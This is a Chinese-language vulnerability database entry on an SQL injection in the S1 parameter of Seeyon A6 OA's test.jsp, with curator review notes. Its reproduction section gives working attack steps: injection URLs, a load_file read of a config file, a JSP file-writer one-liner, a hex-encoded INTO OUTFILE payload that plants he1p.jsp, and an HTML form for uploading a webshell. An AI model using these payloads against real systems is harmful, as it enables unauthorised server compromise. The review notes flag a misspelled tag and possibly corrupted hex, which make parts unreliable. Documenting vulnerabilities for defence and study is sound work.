---
source: "hatch 补库批 20260928"
title: "致远A6 test.jsp S1任意SQL→outfile写入链"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6/MySQL；FILE权限/可写Web路径/输出限制"
prerequisites: "未明确认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-306459d61a10769b804a6e57"
entity_id: "ve-306459d61a10769b804a6e57"
schema_version: "1"
---

# 致远A6 test.jsp S1任意SQL→outfile写入链

## 条目说明

- 对象与具体问题：致远A6；test.jsp S1任意SQL→outfile写入链
- 版本、配置及部署条件：A6/MySQL；FILE权限/可写Web路径/输出限制
- 认证与权限前提：未明确认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与test.jsp长篇相同叙述，root不是唯一且也非充分条件，需FILE/secure_file_priv等
- HTML textarea闭合误拼testarea；hex中的getRealPath反斜杠可能转写损坏待源核
- 源码写文件器为后利用，不能将SQLi默认视为直接RCE；本篇留物理路径只是示例

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

致远A6协同系统 `/yyoa/common/js/menu/test.jsp` 文件 S1 参数SQL注入漏洞

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

注入点为S1变量，通过探测，发现是mysql数据库

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=

于是构造注入语句查询数据库名：

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())

![](./.resource/致远OAA6test.jspsql注入漏洞/media/rId24.png)

Mysql注入中，我们使用into outfile
来写入数据，用此方法注入webshell，前提条件两个：

-   1：root权限

-   2：物理路径

我们探测一下web根目录

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)

![](./.resource/致远OAA6test.jspsql注入漏洞/media/rId25.png)

通过yyoa目录结构猜测物理路径为

    F:/UFseeyon/OA/tomcat/webapps/yyoa/

可以使用load\_file判断是否正确

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)

利用mysql into
outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：

    <%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>

由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27

本地构造上传：

    <html>
        <form action="http://www.0-sec.org/yyoa/he1p.jsp?f=we1come.jsp" method="post">
            <textarea name=t cols=120 rows=10 width=45>your code</testarea>
            <input type=submit value="提交">
        </form>
    </html>

上传后获取webshell地址为：<http://www.0-sec.org/yyoa/we1come.jsp>

参考链接
--------

> <https://www.pa55w0rd.online/yyoa/>
